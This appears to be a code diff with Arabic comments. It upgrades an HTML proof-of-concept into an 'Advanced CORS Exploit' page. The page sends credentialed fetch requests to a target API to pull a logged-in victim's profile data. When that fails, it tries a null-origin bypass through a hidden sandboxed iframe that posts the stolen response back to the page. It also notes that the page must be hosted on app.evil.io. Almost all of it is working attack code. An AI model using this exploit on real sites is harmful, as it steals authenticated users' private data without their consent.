@@ -1,32 +1,78 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC Exploit</title>
+    <title>Advanced CORS Exploit</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
+        #log { background: #000; padding: 15px; border-radius: 5px; color: #0f0; }
+        .success { color: #0f0; font-weight: bold; }
+        .fail { color: #f00; }
+    </style>
 </head>
 <body>
-    <h1>CORS Vulnerability Test</h1>
-    <div id="result">بانتظار جلب البيانات...</div>
+    <h2>جاري فحص استجابة الـ API...</h2>
+    <div id="log">بدء الاختبار...</div>
 
     <script>
-        // رابط الـ API الذي يحتوي على الثغرة
-        const targetUrl = "https://api.target-site.com/user/profile"; 
+        const targetUrl = "https://api.target-site.com/user/profile"; // ضع رابط الـ API هنا
+        const logDiv = document.getElementById('log');
 
-        fetch(targetUrl, {
-            method: 'GET',
-            // إرسال الكوكيز وبيانات الاعتماد هو جوهر الثغرة هنا
-            credentials: 'include' 
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log("تمت سرقة البيانات:", data);
-            document.getElementById('result').innerHTML = 
-                "<h3>تم سحب البيانات بنجاح:</h3>" + 
-                "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
-        })
-        .catch(error => {
-            console.error("فشل الطلب:", error);
-            document.getElementById('result').innerText = "فشل الطلب. قد لا تكون الثغرة قابلة للاستغلال من هذا المنشأ.";
+        function log(msg, isSuccess = false) {
+            const span = document.createElement('p');
+            span.className = isSuccess ? 'success' : 'fail';
+            span.innerText = msg;
+            logDiv.appendChild(span);
+        }
+
+        async function testCORS() {
+            try {
+                // المحاولة الأولى: طلب عادي مع Credentials
+                log("محاولة 1: طلب مباشر مع إرسال بيانات الاعتماد...");
+                const res = await fetch(targetUrl, {
+                    method: 'GET',
+                    credentials: 'include',
+                    mode: 'cors'
+                });
+
+                if (res.ok) {
+                    const data = await res.json();
+                    log("✅ نجاح! تم سحب البيانات:", true);
+                    log(JSON.stringify(data, null, 2), true);
+                }
+            } catch (err) {
+                log("❌ فشل الطلب المباشر: المنشأ الحالي غير مسموح به.");
+                tryNullOrigin();
+            }
+        }
+
+        // محاولة تخطي المنشأ باستخدام iframe (Null Origin)
+        function tryNullOrigin() {
+            log("محاولة 2: اختبار Null Origin عبر iframe sandboxing...");
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.sandbox = 'allow-scripts allow-top-navigation';
+            iframe.srcdoc = `
+                <script>
+                    fetch('${targetUrl}', {credentials: 'include'})
+                    .then(r => r.json())
+                    .then(d => window.parent.postMessage({status: 'success', data: d}, '*'))
+                    .catch(e => window.parent.postMessage({status: 'fail'}, '*'));
+                <\/script>
+            `;
+            document.body.appendChild(iframe);
+        }
+
+        window.addEventListener('message', (event) => {
+            if (event.data.status === 'success') {
+                log("✅ نجاح مذهل! الخادم يقبل Null Origin:", true);
+                log(JSON.stringify(event.data.data, null, 2), true);
+            } else {
+                log("❌ فشل: الخادم لا يقبل Null Origin.");
+                log("تنبيه: يجب تشغيل السكريبت من نطاق app.evil.io ليعمل، أو تعديل ملف Hosts.");
+            }
         });
+
+        testCORS();
     </script>
 </body>
 </html>
